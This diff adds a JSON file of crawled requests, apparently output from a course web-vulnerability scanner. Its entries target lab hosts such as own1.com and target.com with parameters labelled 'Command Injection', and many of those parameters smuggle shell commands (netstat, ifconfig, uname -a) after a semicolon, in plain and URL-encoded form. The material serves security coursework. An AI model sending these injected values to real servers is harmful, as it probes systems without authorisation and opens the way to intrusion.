@@ -1,0 +1,996 @@
+[
+    [
+        {
+            "url": "https://own3.com", 
+            "header": {
+                "Cookie": {}, 
+                "referer": null, 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own1.com/index.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own1.com/index.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own1.com/index.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "https://own1.com/index.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": "netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "language": "None"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "language": "None"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "language": "None"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "language": "None"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": [
+                    "None"
+                ], 
+                "language": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": [
+                    "None"
+                ], 
+                "language": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": [
+                    "None"
+                ], 
+                "language": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "comment": [
+                    "None"
+                ], 
+                "language": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "file": "nofile"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "file": "nofile"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "file": "nofile"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "file": "nofile"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "nofolder", 
+                "file": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "nofolder", 
+                "file": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "nofolder", 
+                "file": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "path": "nofolder", 
+                "file": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": "netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "secret": [
+                    "SECRET"
+                ]
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a", 
+                "secret": [
+                    "SECRET"
+                ]
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "secret": [
+                    "SECRET"
+                ]
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a", 
+                "secret": [
+                    "SECRET"
+                ]
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": [
+                    "abcdef1235"
+                ], 
+                "secret": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": [
+                    "abcdef1235"
+                ], 
+                "secret": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": [
+                    "abcdef1235"
+                ], 
+                "secret": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "csrftoken": [
+                    "abcdef1235"
+                ], 
+                "secret": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/openredirect/success.html", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": null, 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own2.com/own2submit.php", 
+            "header": {
+                "Cookie": {}, 
+                "referer": "https://own2.com", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/sqli/sqli.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own2.com", 
+            "header": {
+                "Cookie": {}, 
+                "referer": null, 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/cats.html", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/csrf/csrf.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own1.com/index.php", 
+            "header": {
+                "Cookie": {}, 
+                "referer": "https://own1.com", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own3.com/own3submit.php", 
+            "header": {
+                "Cookie": {}, 
+                "referer": "https://own3.com", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/sqli/sqli.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "username": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/sqli/sqli.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "username": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/sqli/sqli.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "username": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/sqli/sqli.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "username": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
